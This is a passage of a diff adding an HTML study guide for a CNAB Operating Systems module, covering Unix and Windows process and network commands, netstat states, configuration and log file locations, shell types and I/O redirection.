@@ -1,0 +1,2101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CNAB Study Guide — Operating Systems</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Exo+2:wght@300;400;600&display=swap');
+  :root {
+    --bg:#080c10;--panel:#0d1117;--border:#1c2a3a;--accent:#00e5ff;--accent2:#39ff14;--accent3:#ff6b35;--warn:#ffcc00;--text:#c9d1d9;--dim:#586069;
+    --glow:0 0 8px rgba(0,229,255,0.4);--glow2:0 0 8px rgba(57,255,20,0.4);
+  }
+  *{box-sizing:border-box;margin:0;padding:0;}
+  body{background:var(--bg);color:var(--text);font-family:'Exo 2',sans-serif;font-weight:300;min-height:100vh;overflow-x:hidden;}
+  body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.07) 2px,rgba(0,0,0,0.07) 4px);pointer-events:none;z-index:9999;}
+  header{border-bottom:1px solid var(--border);padding:2rem 2.5rem 1.5rem;position:relative;overflow:hidden;}
+  header::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--accent),transparent);animation:scan-h 3s ease-in-out infinite;}
+  @keyframes scan-h{0%,100%{opacity:0.3;transform:scaleX(0.5);}50%{opacity:1;transform:scaleX(1);}}
+  .header-tag{font-family:'Share Tech Mono',monospace;font-size:0.7rem;color:var(--accent);letter-spacing:0.2em;text-transform:uppercase;margin-bottom:0.5rem;opacity:0.7;}
+  h1{font-family:'Orbitron',sans-serif;font-weight:900;font-size:clamp(1.6rem,4vw,2.8rem);color:#fff;letter-spacing:0.05em;line-height:1.1;}
+  h1 span{color:var(--accent);}
+  .subtitle{font-family:'Share Tech Mono',monospace;font-size:0.78rem;color:var(--dim);margin-top:0.5rem;letter-spacing:0.1em;}
+  .progress-bar{margin-top:1rem;height:3px;background:var(--border);border-radius:2px;overflow:hidden;max-width:400px;}
+  .progress-fill{height:100%;width:0%;background:linear-gradient(90deg,var(--accent),var(--accent2));transition:width 0.3s ease;box-shadow:var(--glow);}
+  .progress-label{font-family:'Share Tech Mono',monospace;font-size:0.65rem;color:var(--dim);margin-top:0.3rem;}
+  .layout{display:grid;grid-template-columns:220px 1fr;min-height:calc(100vh - 120px);}
+  nav{border-right:1px solid var(--border);padding:1.5rem 0;position:sticky;top:0;height:calc(100vh - 120px);overflow-y:auto;}
+  nav::-webkit-scrollbar{width:3px;}nav::-webkit-scrollbar-track{background:transparent;}nav::-webkit-scrollbar-thumb{background:var(--border);}
+  .nav-section{font-family:'Share Tech Mono',monospace;font-size:0.6rem;color:var(--dim);letter-spacing:0.2em;text-transform:uppercase;padding:0.4rem 1.2rem;margin-top:0.5rem;}
+  nav a{display:flex;align-items:center;gap:0.5rem;padding:0.45rem 1.2rem;text-decoration:none;color:var(--dim);font-size:0.78rem;font-family:'Share Tech Mono',monospace;transition:all 0.15s ease;border-left:2px solid transparent;cursor:pointer;}
+  nav a:hover,nav a.active{color:var(--accent);border-left-color:var(--accent);background:rgba(0,229,255,0.04);text-shadow:var(--glow);}
+  nav a .dot{width:5px;height:5px;border-radius:50%;background:var(--border);flex-shrink:0;transition:background 0.15s;}
+  nav a:hover .dot,nav a.active .dot{background:var(--accent);box-shadow:var(--glow);}
+  main{padding:2rem 2.5rem;max-width:920px;}
+  .section{display:none;animation:fadeIn 0.2s ease;}
+  .section.active{display:block;}
+  @keyframes fadeIn{from{opacity:0;transform:translateY(6px);}to{opacity:1;transform:translateY(0);}}
+  .section-header{display:flex;align-items:center;gap:1rem;margin-bottom:1.5rem;padding-bottom:1rem;border-bottom:1px solid var(--border);}
+  .section-icon{font-size:1.5rem;width:42px;height:42px;display:flex;align-items:center;justify-content:center;background:rgba(0,229,255,0.06);border:1px solid var(--border);border-radius:6px;}
+  .section-title{font-family:'Orbitron',sans-serif;font-weight:700;font-size:1.1rem;color:#fff;letter-spacing:0.05em;}
+  .section-meta{font-family:'Share Tech Mono',monospace;font-size:0.65rem;color:var(--dim);}
+  .card{background:var(--panel);border:1px solid var(--border);border-radius:6px;padding:1.2rem 1.4rem;margin-bottom:1rem;position:relative;transition:border-color 0.15s;}
+  .card:hover{border-color:rgba(0,229,255,0.25);}
+  .card::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px;border-radius:6px 0 0 6px;background:var(--accent);opacity:0;transition:opacity 0.15s;}
+  .card:hover::before{opacity:1;}
+  .card-title{font-family:'Orbitron',sans-serif;font-size:0.75rem;font-weight:700;color:var(--accent);letter-spacing:0.1em;text-transform:uppercase;margin-bottom:0.7rem;}
+  .card p{font-size:0.85rem;line-height:1.7;color:var(--text);}
+  .code-block{background:#0a0f14;border:1px solid var(--border);border-radius:4px;padding:0.9rem 1.1rem;margin:0.8rem 0;font-family:'Share Tech Mono',monospace;font-size:0.78rem;overflow-x:auto;position:relative;}
+  .code-block::before{content:'$ ';color:var(--accent2);}
+  .code-block.no-prompt::before{content:'';}
+  .code-line{display:block;color:var(--text);line-height:1.9;}
+  .code-line .cmd{color:var(--accent2);}
+  .code-line .flag{color:var(--warn);}
+  .code-line .comment{color:var(--dim);font-style:italic;}
+  .code-line .path{color:var(--accent3);}
+  .code-line .val{color:var(--accent);}
+  .cmd-table{width:100%;border-collapse:collapse;font-size:0.8rem;margin:0.8rem 0;}
+  .cmd-table th{font-family:'Share Tech Mono',monospace;font-size:0.65rem;letter-spacing:0.15em;text-transform:uppercase;color:var(--accent);padding:0.5rem 0.8rem;border-bottom:1px solid var(--border);text-align:left;}
+  .cmd-table td{padding:0.45rem 0.8rem;border-bottom:1px solid rgba(28,42,58,0.5);vertical-align:top;font-size:0.8rem;line-height:1.5;}
+  .cmd-table tr:hover td{background:rgba(0,229,255,0.03);}
+  .cmd-table .cmd-name{font-family:'Share Tech Mono',monospace;color:var(--accent2);white-space:nowrap;font-size:0.78rem;}
+  .tag{display:inline-block;padding:0.1rem 0.45rem;border-radius:3px;font-family:'Share Tech Mono',monospace;font-size:0.6rem;font-weight:700;letter-spacing:0.05em;text-transform:uppercase;}
+  .tag-unix{background:rgba(57,255,20,0.12);color:var(--accent2);}
+  .tag-win{background:rgba(0,229,255,0.12);color:var(--accent);}
+  .tag-both{background:rgba(255,107,53,0.12);color:var(--accent3);}
+  .tag-warn{background:rgba(255,204,0,0.12);color:var(--warn);}
+  .two-col{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin-bottom:1rem;}
+  @media(max-width:700px){.two-col{grid-template-columns:1fr;}}
+  .three-col{display:grid;grid-template-columns:1fr 1fr 1fr;gap:1rem;margin-bottom:1rem;}
+  @media(max-width:800px){.three-col{grid-template-columns:1fr 1fr;}}
+  .callout{border-left:3px solid var(--warn);background:rgba(255,204,0,0.04);padding:0.8rem 1rem;border-radius:0 4px 4px 0;margin:0.8rem 0;font-size:0.82rem;line-height:1.65;}
+  .callout.info{border-left-color:var(--accent);background:rgba(0,229,255,0.04);}
+  .callout.danger{border-left-color:#ff4444;background:rgba(255,68,68,0.04);}
+  .callout.green{border-left-color:var(--accent2);background:rgba(57,255,20,0.04);}
+  .callout-label{font-family:'Share Tech Mono',monospace;font-size:0.65rem;letter-spacing:0.15em;text-transform:uppercase;margin-bottom:0.3rem;}
+  .callout-label.warn{color:var(--warn);}
+  .callout-label.info{color:var(--accent);}
+  .callout-label.danger{color:#ff4444;}
+  .callout-label.green{color:var(--accent2);}
+  .quiz-q{background:var(--panel);border:1px solid var(--border);border-radius:6px;padding:1.1rem 1.3rem;margin-bottom:0.8rem;}
+  .quiz-q .question{font-size:0.85rem;font-weight:600;color:#fff;margin-bottom:0.8rem;line-height:1.5;}
+  .quiz-option{display:flex;align-items:flex-start;gap:0.6rem;padding:0.4rem 0.6rem;border-radius:4px;cursor:pointer;font-size:0.8rem;transition:background 0.1s;margin-bottom:0.2rem;}
+  .quiz-option:hover{background:rgba(0,229,255,0.05);}
+  .quiz-option input[type="radio"]{accent-color:var(--accent);margin-top:2px;flex-shrink:0;}
+  .quiz-option.correct{background:rgba(57,255,20,0.08);color:var(--accent2);}
+  .quiz-option.wrong{background:rgba(255,68,68,0.08);color:#ff6666;}
+  .quiz-btn{margin-top:0.6rem;background:transparent;border:1px solid var(--accent);color:var(--accent);font-family:'Share Tech Mono',monospace;font-size:0.7rem;letter-spacing:0.1em;padding:0.4rem 0.9rem;border-radius:4px;cursor:pointer;transition:all 0.15s;text-transform:uppercase;}
+  .quiz-btn:hover{background:rgba(0,229,255,0.08);box-shadow:var(--glow);}
+  .feedback{margin-top:0.5rem;font-family:'Share Tech Mono',monospace;font-size:0.72rem;display:none;line-height:1.6;}
+  .feedback.correct{color:var(--accent2);}
+  .feedback.wrong{color:#ff6666;}
+  .checklist{list-style:none;}
+  .checklist li{display:flex;align-items:flex-start;gap:0.7rem;padding:0.35rem 0;font-size:0.83rem;border-bottom:1px solid rgba(28,42,58,0.5);cursor:pointer;user-select:none;}
+  .checklist li:last-child{border-bottom:none;}
+  .check-box{width:14px;height:14px;border:1px solid var(--dim);border-radius:2px;flex-shrink:0;margin-top:2px;display:flex;align-items:center;justify-content:center;transition:all 0.15s;font-size:0.6rem;color:transparent;}
+  .checklist li.checked .check-box{background:var(--accent2);border-color:var(--accent2);color:#000;box-shadow:var(--glow2);}
+  .checklist li.checked span{text-decoration:line-through;color:var(--dim);}
+  h3{font-family:'Orbitron',sans-serif;font-size:0.75rem;font-weight:700;color:var(--accent);letter-spacing:0.12em;text-transform:uppercase;margin:1.4rem 0 0.6rem;}
+  ul.bullets{padding-left:1.2rem;}
+  ul.bullets li{font-size:0.83rem;line-height:1.65;margin-bottom:0.35rem;color:var(--text);}
+  ul.bullets li::marker{color:var(--accent);}
+  .key-val-grid{display:grid;grid-template-columns:auto 1fr;gap:0.3rem 1rem;font-size:0.8rem;}
+  .kv-key{font-family:'Share Tech Mono',monospace;color:var(--accent3);white-space:nowrap;align-self:start;padding-top:1px;}
+  .kv-val{color:var(--text);line-height:1.55;}
+  .divider{border:none;border-top:1px solid var(--border);margin:1.5rem 0;}
+  .mini-tag{font-family:'Share Tech Mono',monospace;font-size:0.65rem;background:rgba(0,229,255,0.1);color:var(--accent);padding:0.05rem 0.35rem;border-radius:2px;}
+
+  /* ─── SITE NAV ─── */
+  .site-nav{position:fixed;top:0;left:0;right:0;height:46px;background:rgba(8,12,16,0.97);border-bottom:1px solid #1c2a3a;backdrop-filter:blur(12px);display:flex;align-items:center;padding:0 1.5rem;z-index:9000;gap:0;}
+  .site-nav::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--accent),transparent);opacity:0.4;}
+  .sn-brand{font-family:'Orbitron',sans-serif;font-weight:900;font-size:0.72rem;color:var(--accent);letter-spacing:0.2em;white-space:nowrap;margin-right:1.5rem;text-decoration:none;}
+  .sn-divider{width:1px;height:20px;background:#1c2a3a;margin-right:0;flex-shrink:0;}
+  .sn-links{display:flex;overflow-x:auto;flex:1;}
+  .sn-links::-webkit-scrollbar{display:none;}
+  .sn-link{font-family:'Share Tech Mono',monospace;font-size:0.68rem;color:#586069;padding:0 1.1rem;height:46px;display:flex;align-items:center;text-decoration:none;border-bottom:2px solid transparent;transition:all 0.15s;white-space:nowrap;letter-spacing:0.05em;flex-shrink:0;}
+  .sn-link:hover{color:#c9d1d9;border-bottom-color:#1c2a3a;}
+  .sn-link.sn-active{color:var(--accent);border-bottom-color:var(--accent);}
+  .sn-link .sn-num{font-size:0.55rem;opacity:0.5;margin-right:0.35rem;}
+  .sn-quiz-btn{margin-left:auto;flex-shrink:0;font-family:'Orbitron',sans-serif;font-weight:700;font-size:0.6rem;letter-spacing:0.12em;color:#080c10;background:var(--accent);border:none;padding:0.3rem 0.9rem;border-radius:4px;cursor:pointer;transition:all 0.15s;white-space:nowrap;text-decoration:none;display:flex;align-items:center;}
+  .sn-quiz-btn:hover{box-shadow:0 0 12px rgba(0,229,255,0.5);}
+  body{padding-top:46px;}
+  header{padding-top:2rem;}
+
+
+  /* ─── MOBILE RESPONSIVE ─── */
+  .sidebar-toggle {
+    display: none;
+    position: fixed;
+    bottom: 1.2rem;
+    right: 1.2rem;
+    width: 48px;
+    height: 48px;
+    border-radius: 50%;
+    background: var(--accent);
+    border: none;
+    color: #080c10;
+    font-size: 1.1rem;
+    cursor: pointer;
+    z-index: 500;
+    box-shadow: 0 4px 16px rgba(0,229,255,0.4);
+    align-items: center;
+    justify-content: center;
+  }
+  .overlay {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.6);
+    z-index: 400;
+    backdrop-filter: blur(2px);
+  }
+  .overlay.active { display: block; }
+
+  @media (max-width: 768px) {
+    body { padding-top: 46px; }
+    header { padding: 1.2rem 1rem 1rem; }
+    h1 { font-size: clamp(1.4rem, 6vw, 2rem); }
+    .subtitle { font-size: 0.65rem; }
+
+    /* Sidebar becomes a slide-in drawer */
+    .layout { grid-template-columns: 1fr; }
+    nav {
+      position: fixed;
+      left: -260px;
+      top: 46px;
+      width: 240px;
+      height: calc(100vh - 46px);
+      background: var(--panel);
+      border-right: 1px solid var(--border);
+      z-index: 450;
+      transition: left 0.25s ease;
+      overflow-y: auto;
+      padding: 1rem 0;
+    }
+    nav.open { left: 0; box-shadow: 4px 0 24px rgba(0,0,0,0.5); }
+    nav a { padding: 0.6rem 1.2rem; font-size: 0.82rem; min-height: 44px; }
+
+    .sidebar-toggle { display: flex; }
+    main { padding: 1rem; }
+    .section-header { flex-direction: column; gap: 0.6rem; }
+    .section-title { font-size: 0.9rem; }
+
+    /* Cards and grids */
+    .two-col, .three-col { grid-template-columns: 1fr; }
+    .card { padding: 0.9rem 1rem; }
+    .card-title { font-size: 0.7rem; }
+    .card p, .card li, ul.bullets li { font-size: 0.82rem; line-height: 1.7; }
+
+    /* Tables — horizontal scroll */
+    .cmd-table { font-size: 0.72rem; display: block; overflow-x: auto; -webkit-overflow-scrolling: touch; }
+    .cmd-table th, .cmd-table td { padding: 0.4rem 0.6rem; white-space: nowrap; }
+    .cmd-table td:last-child { white-space: normal; min-width: 160px; }
+
+    /* Code blocks */
+    .code-block { font-size: 0.72rem; padding: 0.7rem 0.8rem; }
+    .code-line { font-size: 0.72rem; }
+
+    /* Tags */
+    .tag { font-size: 0.55rem; }
+
+    /* Key-val grid */
+    .key-val-grid { grid-template-columns: 1fr; gap: 0; }
+    .kv-key { padding-bottom: 0.1rem; }
+    .kv-val { padding-bottom: 0.6rem; border-bottom: 1px solid var(--border); margin-bottom: 0.3rem; }
+
+    /* Section header icon */
+    .section-icon { width: 36px; height: 36px; font-size: 1.1rem; }
+  }
+
+  @media (max-width: 480px) {
+    .sn-link { padding: 0 0.7rem; font-size: 0.62rem; }
+    .sn-quiz-btn { padding: 0.3rem 0.6rem; font-size: 0.55rem; }
+    h3 { font-size: 0.68rem; }
+    .cmd-table th { font-size: 0.58rem; }
+    .cmd-table td { font-size: 0.68rem; }
+  }
+
+</style>
+</head>
+<body>
+<nav class="site-nav">
+  <a class="sn-brand" href="fundamentals.html">CNAB//SG</a>
+  <div class="sn-divider"></div>
+  <div class="sn-links">
+    <a class="sn-link" href="fundamentals.html"><span class="sn-num">01</span>Fundamentals</a><a class="sn-link" href="networking.html"><span class="sn-num">02</span>Networking</a><a class="sn-link sn-active" href="os-study-guide.html"><span class="sn-num">03</span>Operating Systems</a><a class="sn-link" href="security.html"><span class="sn-num">04</span>Security</a>
+  </div>
+  <a class="sn-quiz-btn" href="cnab-quiz.html">▶ MASTER QUIZ</a>
+</nav>
+
+<header>
+  <div class="header-tag">// CNAB Study Guide — Module 3: Operating Systems</div>
+  <h1>OPERATING <span>SYSTEMS</span></h1>
+  <div class="subtitle">sys_admin · shell_usage · file_systems · security_concepts · registry · services · executables</div>
+  <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+  <div class="progress-label" id="progressLabel">0 / 30 topics mastered</div>
+</header>
+
+<button class="sidebar-toggle" id="sidebarToggle" onclick="toggleSidebar()" aria-label="Toggle navigation">☰</button>
+<div class="overlay" id="overlay" onclick="closeSidebar()"></div>
+
+<div class="layout">
+  <nav>
+    <div class="nav-section">// Core Topics</div>
+    <a onclick="show('admin')" id="nav-admin" class="active"><span class="dot"></span>Admin Commands</a>
+    <a onclick="show('tasklist-sids')" id="nav-tasklist-sids"><span class="dot"></span>Tasklist & SIDs</a>
+    <a onclick="show('shell')" id="nav-shell"><span class="dot"></span>Shell & Scripting</a>
+    <a onclick="show('log-locations')" id="nav-log-locations"><span class="dot"></span>Log Locations</a>
+    <a onclick="show('fs-unix')" id="nav-fs-unix"><span class="dot"></span>Unix Filesystem</a>
+    <a onclick="show('fs-win')" id="nav-fs-win"><span class="dot"></span>Windows Filesystem</a>
+    <a onclick="show('syswow64')" id="nav-syswow64"><span class="dot"></span>SysWOW64 & System32</a>
+    <a onclick="show('registry')" id="nav-registry"><span class="dot"></span>Windows Registry</a>
+    <div class="nav-section">// Security</div>
+    <a onclick="show('datasec')" id="nav-datasec"><span class="dot"></span>Data Security</a>
+    <a onclick="show('av')" id="nav-av"><span class="dot"></span>Antivirus</a>
+    <a onclick="show('integrity')" id="nav-integrity"><span class="dot"></span>Data Integrity</a>
+    <a onclick="show('signing')" id="nav-signing"><span class="dot"></span>Code Signing</a>
+    <div class="nav-section">// System</div>
+    <a onclick="show('drivers')" id="nav-drivers"><span class="dot"></span>Device Drivers</a>
+    <a onclick="show('win-kernels')" id="nav-win-kernels"><span class="dot"></span>Windows Kernel Versions</a>
+    <a onclick="show('services')" id="nav-services"><span class="dot"></span>Services</a>
+    <a onclick="show('boot-runlevel')" id="nav-boot-runlevel"><span class="dot"></span>Boot & Runlevels</a>
+    <a onclick="show('executables')" id="nav-executables"><span class="dot"></span>Executables</a>
+    <a onclick="show('partitions')" id="nav-partitions"><span class="dot"></span>Partitions & FS</a>
+    <a onclick="show('inodes-hdd')" id="nav-inodes-hdd"><span class="dot"></span>Inodes & Hard Drive</a>
+    <div class="nav-section">// Practice</div>
+    <a onclick="show('quiz')" id="nav-quiz"><span class="dot"></span>Quiz (20 Qs)</a>
+    <a onclick="show('checklist')" id="nav-checklist"><span class="dot"></span>Mastery Checklist</a>
+  </nav>
+
+  <main>
+
+<!-- ============================================================ ADMIN COMMANDS -->
+<div class="section active" id="admin">
+  <div class="section-header">
+    <div class="section-icon">⚙️</div>
+    <div><div class="section-title">Administrative Commands</div><div class="section-meta">process · network · system enumeration · output interpretation</div></div>
+  </div>
+
+  <h3>Process Commands</h3>
+  <div style="overflow-x:auto;-webkit-overflow-scrolling:touch;"><table class="cmd-table">
+    <thead><tr><th>Command</th><th>Platform</th><th>Purpose & Key Flags</th></tr></thead>
+    <tbody>
+      <tr><td class="cmd-name">ps aux</td><td><span class="tag tag-unix">Unix</span></td><td>All processes, all users. Columns: USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND</td></tr>
+      <tr><td class="cmd-name">ps -ef</td><td><span class="tag tag-unix">Unix</span></td><td>Full-format listing showing PPID (parent PID). Good for tracing process trees</td></tr>
+      <tr><td class="cmd-name">pstree</td><td><span class="tag tag-unix">Unix</span></td><td>Visual process hierarchy tree. <code>-p</code> shows PIDs, <code>-u</code> shows usernames</td></tr>
+      <tr><td class="cmd-name">top</td><td><span class="tag tag-unix">Unix</span></td><td>Real-time CPU/MEM view. Press <code>k</code> to kill, <code>P</code> sort by CPU, <code>M</code> sort by MEM</td></tr>
+      <tr><td class="cmd-name">htop</td><td><span class="tag tag-unix">Unix</span></td><td>Enhanced top with color bars, mouse support, tree view. Not always pre-installed</td></tr>
+      <tr><td class="cmd-name">tasklist</td><td><span class="tag tag-win">Win</span></td><td>List processes. <code>/svc</code> shows hosted services per PID; <code>/m dll.dll</code> finds processes using a DLL; <code>/fi "STATUS eq RUNNING"</code> filters</td></tr>
+      <tr><td class="cmd-name">taskkill</td><td><span class="tag tag-win">Win</span></td><td><code>/PID 1234</code> graceful; <code>/F /PID 1234</code> force kill; <code>/IM notepad.exe /F</code> by name</td></tr>
+      <tr><td class="cmd-name">wmic process</td><td><span class="tag tag-win">Win</span></td><td><code>list full</code> shows all; <code>where name="cmd.exe" get processid,parentprocessid</code></td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Interpreting ps aux Output in Detail</h3>
+  <div class="code-block no-prompt">
+    <span class="code-line"><span class="val">USER     PID  %CPU %MEM    VSZ   RSS TTY    STAT  START   TIME COMMAND</span></span>
+    <span class="code-line"><span class="cmd">root</span>       1   0.0  0.1 169828  13408 <span class="flag">?</span>      <span class="val">Ss</span>   10:00   0:02 /sbin/init</span>
+    <span class="code-line"><span class="cmd">www-data</span> 512   1.2  2.3 450000  90000 <span class="flag">?</span>      <span class="val">S</span>    10:01   0:45 /usr/sbin/apache2</span>
+    <span class="code-line"><span class="comment"># VSZ = virtual memory size (KB); RSS = resident (physical) RAM used (KB)</span></span>
+    <span class="code-line"><span class="comment"># TTY: ? = no terminal (daemon); pts/0 = pseudoterminal</span></span>
+    <span class="code-line"><span class="comment"># STAT codes: S=sleeping R=running Z=zombie T=stopped</span></span>
+    <span class="code-line"><span class="comment">#             s=session leader +=foreground l=multi-threaded &lt;=high priority</span></span>
+  </div>
+
+  <div class="callout info">
+    <div class="callout-label info">// Zombie Processes</div>
+    A <strong>zombie (Z)</strong> process has finished but its exit status hasn't been collected by the parent (wait() not called). It takes no CPU/memory but wastes a PID slot. Fix: fix the parent process or kill the parent so init/systemd adopts and reaps it.
+  </div>
+
+  <h3>Network Commands</h3>
+  <div style="overflow-x:auto;-webkit-overflow-scrolling:touch;"><table class="cmd-table">
+    <thead><tr><th>Command</th><th>Platform</th><th>Purpose & Output Notes</th></tr></thead>
+    <tbody>
+      <tr><td class="cmd-name">netstat -an</td><td><span class="tag tag-both">Both</span></td><td>All connections, no DNS resolution. Shows TCP/UDP state machine states</td></tr>
+      <tr><td class="cmd-name">netstat -tulpn</td><td><span class="tag tag-unix">Unix</span></td><td>TCP+UDP listening ports with PID/program name (requires root for all PIDs)</td></tr>
+      <tr><td class="cmd-name">netstat -b</td><td><span class="tag tag-win">Win</span></td><td>Show executable name owning each connection (requires admin)</td></tr>
+      <tr><td class="cmd-name">ss -tulpn</td><td><span class="tag tag-unix">Unix</span></td><td>Modern replacement for netstat. Faster, more info. <code>-t</code>TCP <code>-u</code>UDP <code>-l</code>listening <code>-p</code>processes <code>-n</code>numeric</td></tr>
+      <tr><td class="cmd-name">ifconfig</td><td><span class="tag tag-unix">Unix</span></td><td>Interface IP, MAC, MTU, RX/TX packets/errors. Use <code>ifconfig eth0 up/down</code> to toggle</td></tr>
+      <tr><td class="cmd-name">ip addr / ip link</td><td><span class="tag tag-unix">Unix</span></td><td>Modern replacement. <code>ip addr add 10.0.0.5/24 dev eth0</code> to set IP</td></tr>
+      <tr><td class="cmd-name">ipconfig /all</td><td><span class="tag tag-win">Win</span></td><td>Full: IP, mask, gateway, DNS, MAC, DHCP lease. <code>/flushdns</code> clears cache; <code>/release</code> and <code>/renew</code> for DHCP</td></tr>
+      <tr><td class="cmd-name">arp -a</td><td><span class="tag tag-both">Both</span></td><td>ARP cache: IP→MAC mappings. Useful for detecting ARP spoofing (duplicate MACs)</td></tr>
+      <tr><td class="cmd-name">route print</td><td><span class="tag tag-win">Win</span></td><td>Routing table. Unix equiv: <code>ip route</code> or <code>netstat -r</code></td></tr>
+      <tr><td class="cmd-name">nslookup / dig</td><td><span class="tag tag-both">Both</span></td><td>DNS queries. <code>dig @8.8.8.8 example.com A</code> for specific record types</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Reading netstat State Machine</h3>
+  <div class="code-block no-prompt">
+    <span class="code-line"><span class="val">LISTEN</span>      <span class="comment"># Server waiting for connections (foreign=0.0.0.0:*)</span></span>
+    <span class="code-line"><span class="val">ESTABLISHED</span> <span class="comment"># Active connection, data flowing</span></span>
+    <span class="code-line"><span class="val">TIME_WAIT</span>   <span class="comment"># Connection closed, waiting to ensure remote received FIN</span></span>
+    <span class="code-line"><span class="val">CLOSE_WAIT</span>  <span class="comment"># Remote closed, local app hasn't closed socket yet (app bug?)</span></span>
+    <span class="code-line"><span class="val">SYN_SENT</span>    <span class="comment"># Client sent SYN, awaiting SYN-ACK (connecting)</span></span>
+    <span class="code-line"><span class="val">SYN_RECV</span>    <span class="comment"># Server got SYN, sent SYN-ACK (many = SYN flood attack)</span></span>
+    <span class="code-line"><span class="val">FIN_WAIT</span>    <span class="comment"># Local app sent FIN, waiting for remote to finish</span></span>
+  </div>
+
+  <h3>Local System Configuration Files</h3>
+  <div class="two-col">
+    <div class="card">
+      <div class="card-title">Unix Config Locations</div>
+      <div class="key-val-grid">
+        <div class="kv-key">/etc/hosts</div><div class="kv-val">Static name→IP mappings. Checked BEFORE DNS. Can override DNS for testing or blocking</div>
+        <div class="kv-key">/etc/resolv.conf</div><div class="kv-val">DNS servers: <code>nameserver 8.8.8.8</code>. <code>search domain.local</code> for short name resolution</div>
+        <div class="kv-key">/etc/hostname</div><div class="kv-val">Machine's hostname. Change with <code>hostnamectl set-hostname</code></div>
+        <div class="kv-key">/etc/nsswitch.conf</div><div class="kv-val">Name resolution order: <code>hosts: files dns</code> means check /etc/hosts first, then DNS</div>
+        <div class="kv-key">/etc/syslog.conf</div><div class="kv-val">Syslog routing rules: facility.severity → destination file or remote host</div>
+        <div class="kv-key">/var/log/auth.log</div><div class="kv-val">SSH logins, sudo use, su, PAM events. Critical for audit trail</div>
+        <div class="kv-key">/var/log/syslog</div><div class="kv-val">General system messages (kernel, daemons)</div>
+        <div class="kv-key">/var/log/dmesg</div><div class="kv-val">Kernel ring buffer: hardware detect, driver load messages</div>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-title">Windows Config Locations</div>
+      <div class="key-val-grid">
+        <div class="kv-key">C:\Windows\System32\drivers\etc\hosts</div><div class="kv-val">Same as Unix /etc/hosts. Priority over DNS</div>
+        <div class="kv-key">Event Viewer</div><div class="kv-val">GUI: eventvwr.msc. Logs: System, Application, Security, Setup</div>
+        <div class="kv-key">Security Log</div><div class="kv-val">Audit events: logons (4624), failed logons (4625), privilege use (4672)</div>
+        <div class="kv-key">System Log</div><div class="kv-val">Driver/service failures, hardware errors</div>
+        <div class="kv-key">%WINDIR%\System32\winevt\Logs</div><div class="kv-val">Actual .evtx log files on disk</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="callout">
+    <div class="callout-label warn">// Exam Tip: Logging Facilities</div>
+    On Unix, syslog facility codes matter: <strong>auth/authpriv</strong>=authentication, <strong>kern</strong>=kernel, <strong>daemon</strong>=system daemons, <strong>cron</strong>=scheduled tasks. Severity levels: emerg &gt; alert &gt; crit &gt; err &gt; warning &gt; notice &gt; info &gt; debug.
+  </div>
+</div>
+
+<!-- ============================================================ SHELL & SCRIPTING -->
+<div class="section" id="shell">
+  <div class="section-header">
+    <div class="section-icon">🖥️</div>
+    <div><div class="section-title">Shell & Scripting</div><div class="section-meta">bash · cmd · wmic · i/o · variables · operators · expansion · process control</div></div>
+  </div>
+
+  <h3>Shell Overview</h3>
+  <div style="overflow-x:auto;-webkit-overflow-scrolling:touch;"><table class="cmd-table">
+    <thead><tr><th>Shell</th><th>Platform</th><th>Key Characteristics</th></tr></thead>
+    <tbody>
+      <tr><td class="cmd-name">bash</td><td><span class="tag tag-unix">Unix</span></td><td>Bourne Again Shell. Default on most Linux. Scripting standard. RC file: ~/.bashrc (interactive) ~/.bash_profile (login)</td></tr>
+      <tr><td class="cmd-name">sh</td><td><span class="tag tag-unix">Unix</span></td><td>POSIX-compliant minimal shell. Scripts written for sh are maximally portable. No arrays, no [[, no $(())</td></tr>
+      <tr><td class="cmd-name">zsh</td><td><span class="tag tag-unix">Unix</span></td><td>Feature-rich. macOS default since Catalina. Better tab completion, themes (Oh My Zsh). RC: ~/.zshrc</td></tr>
+      <tr><td class="cmd-name">ksh</td><td><span class="tag tag-unix">Unix</span></td><td>Korn shell. Common on AIX/Solaris. Basis for many bash features</td></tr>
+      <tr><td class="cmd-name">cmd.exe</td><td><span class="tag tag-win">Win</span></td><td>Legacy Windows shell. Batch scripts (.bat/.cmd). Limited compared to bash. Internal commands: dir, copy, del, echo</td></tr>
+      <tr><td class="cmd-name">PowerShell</td><td><span class="tag tag-win">Win</span></td><td>Object-oriented shell. Cmdlets return .NET objects not text. Cross-platform (PS Core). Scripts: .ps1</td></tr>
+      <tr><td class="cmd-name">wmic</td><td><span class="tag tag-win">Win</span></td><td>WMI Command-line. Deprecated in Win11 but still tested. Powerful querying: <code>wmic cpu get name</code>, <code>wmic logicaldisk</code></td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>I/O Redirection — Complete Reference</h3>
+  <div class="two-col">
+    <div class="card">
+      <div class="card-title">Unix / Bash</div>
+      <div class="code-block no-prompt">
+        <span class="code-line"><span class="cmd">cmd</span> &gt; <span class="path">file</span>         <span class="comment"># stdout → file (overwrite)</span></span>
+        <span class="code-line"><span class="cmd">cmd</span> &gt;&gt; <span class="path">file</span>        <span class="comment"># stdout → file (append)</span></span>
+        <span class="code-line"><span class="cmd">cmd</span> 2&gt; <span class="path">err.txt</span>    <span class="comment"># stderr → file</span></span>
+        <span class="code-line"><span class="cmd">cmd</span> 2&gt;&amp;1         <span class="comment"># stderr → same place as stdout</span></span>
+        <span class="code-line"><span class="cmd">cmd</span> &gt; <span class="path">f</span> 2&gt;&amp;1     <span class="comment"># both stdout+stderr → file</span></span>
